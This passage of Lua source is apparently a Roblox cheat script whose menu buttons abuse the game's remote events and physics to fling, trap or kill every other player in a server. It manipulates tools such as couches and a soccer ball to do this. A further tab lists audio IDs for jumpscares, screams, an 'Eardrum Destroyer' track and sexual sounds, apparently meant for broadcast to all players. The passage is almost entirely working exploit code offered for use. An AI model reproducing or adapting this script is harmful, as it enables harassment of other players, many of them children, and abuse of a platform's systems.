                        RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)  
                    until Humanoid.Sit  
                end  
            end  
        end  
  
        task.wait(0.5)  
        PCar = Vehicles:FindFirstChild(Player.Name.."Car")  
  
        if PCar then  
            if not Humanoid.Sit then  
                local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")  
                if Seat then  
                    repeat  
                        task.wait()  
                        RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)  
                    until Humanoid.Sit  
                end  
            end  
        end  
  
        local SpinGyro = Instance.new("BodyGyro")  
        SpinGyro.Parent = PCar.PrimaryPart  
        SpinGyro.MaxTorque = Vector3.new(1e7, 1e7, 1e7)  
        SpinGyro.P = 1e7  
        SpinGyro.CFrame = PCar.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(90), 0)  
  
        local function flingPlayer(TargetC, TargetRP, TargetH)
            Angles = 0  
            local endTime = tick() + 1  
            while tick() < endTime do  
                Angles = Angles + 100  
                task.wait()  
  
                local kill = function(alvo, pos, angulo)  
                    PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * angulo)  
                end  
  
                kill(TargetRP, CFrame.new(0, 3, 0), CFrame.Angles(math.rad(Angles), 0, 0))  
                kill(TargetRP, CFrame.new(0, -1.5, 2), CFrame.Angles(math.rad(Angles), 0, 0))  
                kill(TargetRP, CFrame.new(2, 1.5, 2.25), CFrame.Angles(math.rad(50), 0, 0))  
                kill(TargetRP, CFrame.new(-2.25, -1.5, 2.25), CFrame.Angles(math.rad(30), 0, 0))  
                kill(TargetRP, CFrame.new(0, 1.5, 0), CFrame.Angles(math.rad(Angles), 0, 0))  
                kill(TargetRP, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(Angles), 0, 0))  
            end  
        end  
  
        for _, Target in pairs(game.Players:GetPlayers()) do  
            if Target ~= Player then  
                local TargetC = Target.Character  
                local TargetH = TargetC and TargetC:FindFirstChildOfClass("Humanoid")  
                local TargetRP = TargetC and TargetC:FindFirstChild("HumanoidRootPart")  
  
                if TargetC and TargetH and TargetRP then  
                    flingPlayer(TargetC, TargetRP, TargetH)  
                end  
            end  
        end  
  
        task.wait(0.5)  
        PCar:SetPrimaryPartCFrame(CFrame.new(0, 0, 0))  
        task.wait(0.5)  
        Humanoid.Sit = false  
        task.wait(0.5)  
        RootPart.CFrame = OldPos  
  
        SpinGyro:Destroy()  
    end
})

Tab:AddButton({
    Name = "Auto Fling All",
    Callback = function()
        local Players = game:GetService("Players")
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local LocalPlayer = Players.LocalPlayer
        local cam = workspace.CurrentCamera

        local function ProcessPlayer(target)
            if not target or not target.Character or target == LocalPlayer then return end
            
            local flingActive = true
            local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
            if not root or not tRoot then return end
            
            local char = LocalPlayer.Character
            local hum = char:FindFirstChildOfClass("Humanoid")
            local original = root.CFrame

            ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
            task.wait(0.2)

            ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
            task.wait(0.3)

            local tool = LocalPlayer.Backpack:FindFirstChild("Couch")
            if tool then
                tool.Parent = char
            end
            task.wait(0.1)

            game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.F, false, game)
            task.wait(0.25)

            workspace.FallenPartsDestroyHeight = 0/0

            local bv = Instance.new("BodyVelocity")
            bv.Name = "FlingForce"
            bv.Velocity = Vector3.new(9e8, 9e8, 9e8)
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Parent = root

            hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
            hum.PlatformStand = false
            cam.CameraSubject = target.Character:FindFirstChild("Head") or tRoot or hum

            task.spawn(function()
                local angle = 0
                local parts = {root}
                while flingActive and target and target.Character and target.Character:FindFirstChildOfClass("Humanoid") do
                    local tHum = target.Character:FindFirstChildOfClass("Humanoid")
                    if tHum.Sit then break end
                    angle += 50

                    for _, part in ipairs(parts) do
                        local hrp = target.Character.HumanoidRootPart
                        local pos = hrp.Position + hrp.Velocity / 1.5
                        root.CFrame = CFrame.new(pos) * CFrame.Angles(math.rad(angle), 0, 0)
                    end

                    root.Velocity = Vector3.new(9e8, 9e8, 9e8)
                    root.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
                    task.wait()
                end

                flingActive = false
                bv:Destroy()
                hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                hum.PlatformStand = false
                root.CFrame = original
                cam.CameraSubject = hum

                for _, p in pairs(char:GetDescendants()) do
                    if p:IsA("BasePart") then
                        p.Velocity = Vector3.zero
                        p.RotVelocity = Vector3.zero
                    end
                end

                hum:UnequipTools()
                ReplicatedStorage.RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
            end)
           
            while flingActive do
                task.wait()
            end
        end

        for _, player in ipairs(Players:GetPlayers()) do
            ProcessPlayer(player)
        end
    end
})



Tab:AddButton({
    Name = "Bring All Couch [melhor]",
    Callback = function()
        local args = {
            [1] = "ClearAllTools"
        }

        game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args))

        wait(0.2)

        toolselcted = "Couch"
        picktoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        cleartoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s")

        oldcf = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
            task.wait()
            game.Players.LocalPlayer.Character.Humanoid.Sit = false
        end
        wait(0.1)

        if game:GetService("Workspace"):FindFirstChild("Camera") then
            game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() 
        end

        for m=1,2 do 
            task.wait()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -490, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922)
        end
        task.wait(0.2)
        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
        wait(0.5)

        for aidj,afh in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
            if afh.Name == toolselcted == false then
                if afh:IsA("Tool") then
                    afh.Parent = game.Players.LocalPlayer.Backpack
                end
            end
        end

        for aiefhiewhwf,dvjbvj in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
            if dvjbvj:IsA("Tool") then
                if dvjbvj.Name == toolselcted == false then
                    dvjbvj:Destroy()
                end
            end
        end

        for ttjtjutjutjjtj,ddvdvdsvdfbrnytytmvdv in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
            if ddvdvdsvdfbrnytytmvdv:IsA("Tool") then
                if ddvdvdsvdfbrnytytmvdv.name == toolselcted == false then
                    ddvdvdsvdfbrnytytmvdv:Destroy()
                end
            end
        end

        for findin,toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
            if toollel:IsA("Tool") then
                if toollel.Name == toolselcted then
                    toollllfoun2 = true
                    for basc,aijfw in pairs(toollel:GetDescendants()) do
                        if aijfw.Name == "Handle" then
                            aijfw.Name = "H√¢¬•a√¢¬•n√¢¬•d√¢¬•l√¢¬•e"
                            toollel.Parent = game.Players.LocalPlayer.Backpack
                            toollel.Parent = game.Players.LocalPlayer.Character
                            tollllahhhh = toollel
                            task.wait()
                        end
                    end
                else 
                    toollllfoun2 = false
                end
            end
        end

        for fiifi,toollll in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
            if toollll:IsA("Tool") then
                if toollll.Name == toolselcted then
                    toollllfoun = true
                    for nana,jjsjsj in pairs(toollll:GetDescendants()) do
                        if jjsjsj.Name == "Handle" then
                            toollll.Parent = game.Players.LocalPlayer.Character
                            wait()
                            jjsjsj.Name = "H√¢¬•a√¢¬•n√¢¬•d√¢¬•l√¢¬•e"
                            toollll.Parent = game.Players.LocalPlayer.Backpack
                            toollll.Parent = game.Players.LocalPlayer.Character
                            toolllffel = toollll
                        end
                    end
                else 
                    toollllfoun = false
                end
            end
        end

        if toollllfoun == true then
            if game.Players.LocalPlayer.Character:FindFirstChild(toolllffel) == nil then  
                toollllfoun = false 
            end
            repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild(toolllffel) == nil
            toollllfoun = false
        end

        if toollllfoun2 == true then
            if game.Players.LocalPlayer.Character:FindFirstChild(tollllahhhh) == nil then 
                toollllfoun2 = false 
            end
            repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild(tollllahhhh) == nil
            toollllfoun2 = false
        end

        wait(0.1)

        for m=1, 25 do
            if game:GetService("Workspace"):FindFirstChild("Camera") then
                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() 
            end

            local args = {
                [1] = "PickingTools",
                [2] = toolselcted
            }
            
            picktoolremote:InvokeServer(unpack(args))
            game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolselcted).Parent = game.Players.LocalPlayer.Character
            wait()
            game:GetService("Players").LocalPlayer.Character[toolselcted]:FindFirstChild("Handle").Name = "H√¢¬•a√¢¬•n√¢¬•d√¢¬•l√¢¬•e"
            game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Backpack
            game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Character

            repeat  
                if game:GetService("Workspace"):FindFirstChild("Camera") then
                    game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() 
                end
                task.wait() 
            until game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselcted) == nil
        end

        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
        repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") == nil
        repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldcf
        wait()

        for wwefef,weifwwe in pairs(game.Players:GetPlayers()) do
            if weifwwe.Name == game.Players.LocalPlayer.Name == false then
                ewoifjwoifjiwo = wwefef
            end
        end

        for m=1,ewoifjwoifjiwo do
            game.Players.LocalPlayer.Backpack.Couch.Name = "couch"..m
        end

        wait()

        for weofefawd,iwiejguiwg in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            if iwiejguiwg.Name == "couch"..weofefawd then
                iwiejguiwg.Handle.Name = "Handle "
            end
        end

        wait(0.2)

        local function bring(skjdfuwiruwg,woiejewg)
            if woiejewg == nil == false then
                game.Players.LocalPlayer.Backpack["couch"..skjdfuwiruwg]:FindFirstChild("Seat1").Disabled = true
                game.Players.LocalPlayer.Backpack["couch"..skjdfuwiruwg]:FindFirstChild("Seat2").Disabled = true
                game.Players.LocalPlayer.Backpack["couch"..skjdfuwiruwg].Parent = game.Players.LocalPlayer.Character
                tet = Instance.new("BodyVelocity", game.Players.LocalPlayer.Character["couch"..skjdfuwiruwg]:FindFirstChild("Handle "))
                tet.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
                tet.P = 1250
                tet.Velocity = Vector3.new(0,0,0)
                tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"

                repeat
                    for m=1,35 do
                        local pos = {x=0, y=0, z=0}
                        pos.x = woiejewg.Character.HumanoidRootPart.Position.X
                        pos.y = woiejewg.Character.HumanoidRootPart.Position.Y
                        pos.z = woiejewg.Character.HumanoidRootPart.Position.Z
                        pos.x = pos.x + woiejewg.Character.HumanoidRootPart.Velocity.X / 2
                        pos.y = pos.y + woiejewg.Character.HumanoidRootPart.Velocity.Y / 2
                        pos.z = pos.z + woiejewg.Character.HumanoidRootPart.Velocity.Z / 2
                        game.Players.LocalPlayer.Character["couch"..skjdfuwiruwg]:FindFirstChild("Seat1").CFrame = CFrame.new(Vector3.new(pos.x,pos.y,pos.z)) * CFrame.new(-2,2,0)
                        task.wait()
                    end
                    game.Players.LocalPlayer.Character["couch"..skjdfuwiruwg].Parent = game.Players.LocalPlayer.Backpack
                    wait()
                    game.Players.LocalPlayer.Backpack["couch"..skjdfuwiruwg]:FindFirstChild("Handle ").Name = "Handle"
                    wait(0.2)
                    game.Players.LocalPlayer.Backpack["couch"..skjdfuwiruwg].Parent = game.Players.LocalPlayer.Character
                    wait()
                    game.Players.LocalPlayer.Character["couch"..skjdfuwiruwg].Parent = game.Players.LocalPlayer.Backpack
                    game.Players.LocalPlayer.Backpack["couch"..skjdfuwiruwg].Handle.Name = "Handle "
                    wait(0.2)
                    game.Players.LocalPlayer.Backpack["couch"..skjdfuwiruwg].Parent = game.Players.LocalPlayer.Character
                    tet = Instance.new("BodyVelocity", game.Players.LocalPlayer.Character["couch"..skjdfuwiruwg]:FindFirstChild("Seat1"))
                    tet.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
                    tet.P = 1250
                    tet.Velocity = Vector3.new(0,0,0)
                    tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"
                until woiejewg.Character.Humanoid.Sit == true

                wait()
                game.Players.LocalPlayer.Character["couch"..skjdfuwiruwg]:FindFirstChild("Handle "):FindFirstChild("#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"):Destroy()
                game.Players.LocalPlayer.Character["couch"..skjdfuwiruwg].Parent = game.Players.LocalPlayer.Backpack
                wait()
                game.Players.LocalPlayer.Backpack["couch"..skjdfuwiruwg]:FindFirstChild("Handle ").Name = "Handle"
                wait(0.2)
                game.Players.LocalPlayer.Backpack["couch"..skjdfuwiruwg].Parent = game.Players.LocalPlayer.Character
                wait()
                game.Players.LocalPlayer.Character["couch"..skjdfuwiruwg].Parent = game.Players.LocalPlayer.Backpack
            end
        end

        for mwef,weuerg in pairs(game.Players:GetPlayers()) do
            if weuerg.Name == game.Players.LocalPlayer.Name == false then
                spawn(function()
                    bring(mwef,weuerg)
                end)
            end
        end
    end
})


Tab:AddButton({
    Name = "Kill All Couch [melhor]",
    Callback = function()
        local args = {
            [1] = "ClearAllTools"
        }

        game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args))

        wait(0.2)

        local initialPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position

        local part = Instance.new("Part")
        part.Size = Vector3.new(5000, 10, 5000)
        part.Position = Vector3.new(0, -500, 0)
        part.Anchored = true
        part.CanCollide = true
        part.Parent = game.Workspace
        task.wait()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -500, 0)
        wait(2)
        toolselcted = "Couch"
        picktoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l")
        cleartoolremote = game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s")
        oldcf = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
            task.wait()
            game.Players.LocalPlayer.Character.Humanoid.Sit = false
        end
        wait(0.1)
        if game:GetService("Workspace"):FindFirstChild("Camera") then
            game:GetService("Workspace"):FindFirstChild("Camera"):Destroy()
        end
        for m=1,2 do 
            task.wait()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(999999999.414, -490, 999999999.414, 0.974360406, -0.175734088, 0.14049761, -0.133441404, 0.0514053069, 0.989722729, -0.181150302, -0.983094692, 0.0266370922)
        end
        task.wait(0.2)
        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
        wait(0.5)
        for aidj,afh in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
            if afh.Name == toolselcted == false then
                if afh:IsA("Tool") then
                    afh.Parent = game.Players.LocalPlayer.Backpack
                end
            end
        end
        for aiefhiewhwf,dvjbvj in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
            if dvjbvj:IsA("Tool") then
                if dvjbvj.Name == toolselcted == false then
                    dvjbvj:Destroy()
                end
            end
        end
        for ttjtjutjutjjtj,ddvdvdsvdfbrnytytmvdv in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
            if ddvdvdsvdfbrnytytmvdv:IsA("Tool") then
                if ddvdvdsvdfbrnytytmvdv.Name == toolselcted == false then
                    ddvdvdsvdfbrnytytmvdv:Destroy()
                end
            end
        end
        for findin,toollel in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
            if toollel:IsA("Tool") then
                if toollel.Name == toolselcted then
                    toollllfoun2 = true
                    for basc,aijfw in pairs(toollel:GetDescendants()) do
                        if aijfw.Name == "Handle" then
                            aijfw.Name = "H√É¬¢√Ç √Ç¬•a√É¬¢√Ç √Ç¬•n√É¬¢√Ç √Ç¬•d√É¬¢√Ç √Ç¬•l√É¬¢√Ç √Ç¬•e"
                            toollel.Parent = game.Players.LocalPlayer.Backpack
                            toollel.Parent = game.Players.LocalPlayer.Character
                            tollllahhhh = toollel
                            task.wait()
                        end
                    end
                else 
                    toollllfoun2 = false
                end
            end
        end
        for fiifi,toollll in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
            if toollll:IsA("Tool") then
                if toollll.Name == toolselcted then
                    toollllfoun = true
                    for nana,jjsjsj in pairs(toollll:GetDescendants()) do
                        if jjsjsj.Name == "Handle" then
                            toollll.Parent = game.Players.LocalPlayer.Character
                            wait()
                            jjsjsj.Name = "H√É¬¢√Ç √Ç¬•a√É¬¢√Ç √Ç¬•n√É¬¢√Ç √Ç¬•d√É¬¢√Ç √Ç¬•l√É¬¢√Ç √Ç¬•e"
                            toollll.Parent = game.Players.LocalPlayer.Backpack
                            toollll.Parent = game.Players.LocalPlayer.Character
                            toolllffel = toollll
                        end
                    end
                else 
                    toollllfoun = false
                end
            end
        end
        if toollllfoun == true then
            if game.Players.LocalPlayer.Character:FindFirstChild(toolllffel) == nil then 
                toollllfoun = false 
            end
            repeat 
                wait() 
            until game.Players.LocalPlayer.Character:FindFirstChild(toolllffel) == nil
            toollllfoun = false
        end
        if toollllfoun2 == true then
            if game.Players.LocalPlayer.Character:FindFirstChild(tollllahhhh) == nil then 
                toollllfoun2 = false 
            end
            repeat 
                wait() 
            until game.Players.LocalPlayer.Character:FindFirstChild(tollllahhhh) == nil
            toollllfoun2 = false
        end
        wait(0.1)
        
        local args = {
            [1] = "PickingTools",
            [2] = toolselcted
        }

        picktoolremote:InvokeServer(unpack(args)) 
        game:GetService("Players").LocalPlayer.Backpack:WaitForChild(toolselcted).Parent = game.Players.LocalPlayer.Character 
        wait() 
        game:GetService("Players").LocalPlayer.Character[toolselcted]:FindFirstChild("Handle").Name = "H√É¬¢√Ç √Ç¬•a√É¬¢√Ç √Ç¬•n√É¬¢√Ç √Ç¬•d√É¬¢√Ç √Ç¬•l√É¬¢√Ç √Ç¬•e" 
        game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Backpack 
        game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(toolselcted).Parent = game.Players.LocalPlayer.Character 
        repeat 
            if game:GetService("Workspace"):FindFirstChild("Camera") then 
                game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() 
            end 
            task.wait() 
        until game:GetService("Players").LocalPlayer.Character:FindFirstChild(toolselcted) == nil 

        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false 
        repeat 
            wait() 
        until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") == nil 
        repeat 
            wait() 
        until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") 
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldcf 
        wait() 
        
        for wwefef,weifwwe in pairs(game.Players:GetPlayers()) do 
            if weifwwe.Name == game.Players.LocalPlayer.Name == false then 
                ewoifjwoifjiwo = wwefef 
            end 
        end 
        for m=1,ewoifjwoifjiwo do 
            game.Players.LocalPlayer.Backpack.Couch.Name = "Chaos Couch"..m 
        end 
        wait() 
        for weofefawd,iwiejguiwg in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do 
            if iwiejguiwg.Name == "Chaos Couch"..weofefawd then 
                iwiejguiwg.Handle.Name = "Handle " 
            end 
        end 
        wait(0.2) 
        local function bring(skjdfuwiruwg,woiejewg) 
            if woiejewg == nil == false then 
                game.Players.LocalPlayer.Backpack["Chaos Couch"..skjdfuwiruwg]:FindFirstChild("Seat1").Disabled = true 
                game.Players.LocalPlayer.Backpack["Chaos Couch"..skjdfuwiruwg]:FindFirstChild("Seat2").Disabled = true 
                game.Players.LocalPlayer.Backpack["Chaos Couch"..skjdfuwiruwg].Parent = game.Players.LocalPlayer.Character 
                tet = Instance.new("BodyVelocity", game.Players.LocalPlayer.Character["Chaos Couch"..skjdfuwiruwg]:FindFirstChild("Handle ")) 
                tet.MaxForce = Vector3.new(math.huge,math.huge,math.huge) 
                tet.P = 1250 
                tet.Velocity = Vector3.new(0,0,0) 
                tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W" 
                repeat 
                    for m=1,35 do 
                        local pos = {x=0, y=0, z=0} 
                        pos.x = woiejewg.Character.HumanoidRootPart.Position.X 
                        pos.y = woiejewg.Character.HumanoidRootPart.Position.Y 
                        pos.z = woiejewg.Character.HumanoidRootPart.Position.Z 
                        pos.x = pos.x + woiejewg.Character.HumanoidRootPart.Velocity.X / 2 
                        pos.y = pos.y + woiejewg.Character.HumanoidRootPart.Velocity.Y / 2 
                        pos.z = pos.z + woiejewg.Character.HumanoidRootPart.Velocity.Z / 2 
                        game.Players.LocalPlayer.Character["Chaos Couch"..skjdfuwiruwg]:FindFirstChild("Seat1").CFrame = CFrame.new(Vector3.new(pos.x,pos.y,pos.z)) * CFrame.new(-2,2,0) 
                        task.wait() 
                    end 
                    game.Players.LocalPlayer.Character["Chaos Couch"..skjdfuwiruwg].Parent = game.Players.LocalPlayer.Backpack 
                    wait() 
                    game.Players.LocalPlayer.Backpack["Chaos Couch"..skjdfuwiruwg]:FindFirstChild("Handle ").Name = "Handle" 
                    wait(0.2) 
                    game.Players.LocalPlayer.Backpack["Chaos Couch"..skjdfuwiruwg].Parent = game.Players.LocalPlayer.Character 
                    wait() 
                    game.Players.LocalPlayer.Character["Chaos Couch"..skjdfuwiruwg].Parent = game.Players.LocalPlayer.Backpack 
                    game.Players.LocalPlayer.Backpack["Chaos Couch"..skjdfuwiruwg].Handle.Name = "Handle " 
                    wait(0.2) 
                    game.Players.LocalPlayer.Backpack["Chaos Couch"..skjdfuwiruwg].Parent = game.Players.LocalPlayer.Character 
                    tet = Instance.new("BodyVelocity", game.Players.LocalPlayer.Character["Chaos Couch"..skjdfuwiruwg]:FindFirstChild("Seat1")) 
                    tet.MaxForce = Vector3.new(math.huge,math.huge,math.huge) 
                    tet.P = 1250 
                    tet.Velocity = Vector3.new(0,0,0) 
                    tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W" 
                until woiejewg.Character.Humanoid.Sit == true 
                wait() 
                game.Players.LocalPlayer.Character["Chaos Couch"..skjdfuwiruwg]:FindFirstChild("Handle "):FindFirstChild("#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"):Destroy() 
                game.Players.LocalPlayer.Character["Chaos Couch"..skjdfuwiruwg].Parent = game.Players.LocalPlayer.Backpack 
                wait() 
                game.Players.LocalPlayer.Backpack["Chaos Couch"..skjdfuwiruwg]:FindFirstChild("Handle ").Name = "Handle" 
                wait(0.2) 
                game.Players.LocalPlayer.Backpack["Chaos Couch"..skjdfuwiruwg].Parent = game.Players.LocalPlayer.Character 
                wait() 
                game.Players.LocalPlayer.Character["Chaos Couch"..skjdfuwiruwg].Parent = game.Players.LocalPlayer.Backpack 
            end 
        end 
        for mwef,weuerg in pairs(game.Players:GetPlayers()) do 
            if weuerg.Name == game.Players.LocalPlayer.Name == false then 
                spawn(function() bring(mwef,weuerg) end) 
            end 
        end 

        task.delay(14, function()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(initialPosition)
        end)

        task.delay(14.1, function()
            game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer(unpack(args))
        end)
    end
})

Tab:AddButton({
    Name = "Fling Ball all",
    Callback = function()
        local player = game:GetService("Players").LocalPlayer
        local SoccerBalls = workspace.WorkspaceCom["001_SoccerBalls"]
        local MyBall = SoccerBalls:FindFirstChild("Soccer"..player.Name)

        if not MyBall then
            if not player.Backpack:FindFirstChild("SoccerBall") then
                local args = {[1]="PickingTools",[2]="SoccerBall"}
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
                task.wait()
                player.Backpack.SoccerBall.Parent = player.Character
                repeat MyBall = SoccerBalls:FindFirstChild("Soccer"..player.Name) task.wait() until MyBall
                player.Character.SoccerBall.Parent = player.Backpack
                task.wait()
            else
                player.Backpack.SoccerBall.Parent = player.Character
                repeat MyBall = SoccerBalls:FindFirstChild("Soccer"..player.Name) task.wait() until MyBall
                player.Character.SoccerBall.Parent = player.Backpack
            end
        end

        for i,v in pairs(game.Players:GetPlayers()) do
            if v ~= game.Players.LocalPlayer then
                local target = v
                local TCharacter = target.Character or target.CharacterAdded:Wait()
                local THumanoidRootPart = TCharacter:WaitForChild("HumanoidRootPart")
                if not MyBall or not THumanoidRootPart then return end

                for _,v in pairs(MyBall:GetChildren()) do
                    if v:IsA("BodyMover") then v:Destroy() end
                end

                local bodyVelocity = Instance.new("BodyVelocity")
                bodyVelocity.Velocity = Vector3.new(9e8,9e8,9e8)
                bodyVelocity.MaxForce = Vector3.new(1/0,1/0,1/0)
                bodyVelocity.P = 1e10
                bodyVelocity.Parent = MyBall

                local bv = Instance.new("BodyVelocity")
                bv.Velocity = Vector3.new(9e8,9e8,9e8)
                bv.MaxForce = Vector3.new(1/0,1/0,1/0)
                bv.P = 1e9
                bv.Parent = THumanoidRootPart

                local oldPos = THumanoidRootPart.Position
                workspace.CurrentCamera.CameraSubject = THumanoidRootPart

                repeat
                    local velocity = THumanoidRootPart.Velocity.Magnitude
                    local parts = {}
                    for _,v in pairs(TCharacter:GetDescendants()) do
                        if v:IsA("BasePart") and v.CanCollide and not v.Anchored then 
                            table.insert(parts,v) 
                        end
                    end
                    for _,part in ipairs(parts) do
                        local pos_x = target.Character.HumanoidRootPart.Position.X
                        local pos_y = target.Character.HumanoidRootPart.Position.Y
                        local pos_z = target.Character.HumanoidRootPart.Position.Z
                        pos_x = pos_x + (target.Character.HumanoidRootPart.Velocity.X/1.5)
                        pos_y = pos_y + (target.Character.HumanoidRootPart.Velocity.Y/1.5)
                        pos_z = pos_z + (target.Character.HumanoidRootPart.Velocity.Z/1.5)
                        MyBall.CFrame = CFrame.new(pos_x,pos_y,pos_z)
                        task.wait(1/6000)
                    end
                    task.wait(1/6000)
                until THumanoidRootPart.Velocity.Magnitude>5000 or TCharacter.Humanoid.Health==0 or target.Parent~=game.Players or THumanoidRootPart.Parent~=TCharacter or TCharacter~=target.Character

            end
        end

        workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
    end
})


local Tab = Window:MakeTab({"Sound all ", "audio"})


local audios = {
    {Name = "Nuclear Siren", ID = 675587093},
    {Name = "Yamete Kudasai", ID = 108494476595033},
    {Name = "Sonic.exe", ID = 2496367477},
    {Name = "Little Scream", ID = 5710016194},
    {Name = "Horrifying Jumpscare", ID = 85435253347146},
    {Name = "The Boiled One", ID = 137177653817621},
    {Name = "Loud Audio", ID = 6855150757},
    {Name = "Static Noise", ID = 120034877160791},
    {Name = "Jumpscare 2", ID = 110637995610528},
    {Name = "Witch Laugh Minecraft", ID = 116214940486087},
    {Name = "Mandrake Detected", ID = 9068077052},
    {Name = "Aaaaaaaaa", ID = 80156405968805},
    {Name = "AAAHHHH", ID = 9084006093},
    {Name = "Among Us", ID = 6651571134},
    {Name = "Sus", ID = 6701126635},
    {Name = "Big Scream AAAAAAAAA", ID = 5853668794},
    {Name = "UHHHHH COFFCOFF", ID = 7056720271},
    {Name = "SUS", ID = 7153419575},
    {Name = "Tubers93 1", ID = 270145703},
    {Name = "Tubers93 2", ID = 18131809532},
    {Name = "John's Laugh", ID = 130759239},
    {Name = "Random Sound", ID = 6549021381},
    {Name = "Scream", ID = 80156405968805},
    {Name = "Strange Audio", ID = 7705506391},
    {Name = "AAAH", ID = 7772283448},
    {Name = "Gay, gay", ID = 18786647417},
    {Name = "Bat Hit", ID = 7129073354},
    {Name = "Random Name", ID = 7520729342},
    {Name = "Scream 2", ID = 91412024101709},
    {Name = "Eardrum Destroyer", ID = 268116333},
    {Name = "[ Content Deleted ]", ID = 106835463235574},
    {Name = "Take Jack", ID = 132603645477541},
    {Name = "Order Ifood", ID = 133843750864059},
    {Name = "I Ghost The Down", ID = 84663543883498},
    {Name = "Buy Online At Shopee", ID = 8747441609},
    {Name = "Ew Disgusting", ID = 103440368630269},
    {Name = "Get Out Dishwasher", ID = 101232400175829},
    {Name = "Crazy Not Worth It", ID = 78442476709262},
    {Name = "(NEW) Chimpanzini Bananini Funk", ID = 137148228908678},
    {Name = "(NEW) Candyland - Tobu", ID = 118939739460633},
    {Name = "(NEW) Dom Pollo What The Hell Meme", ID = 100656590080703},
    {Name = "(NEW) Don't Understand Overblown Meme", ID = 7962533987},
    {Name = "Pankapakan", ID = 122547522269143},
    {Name = "Ultra Fast Moan", ID = 128863565301778},
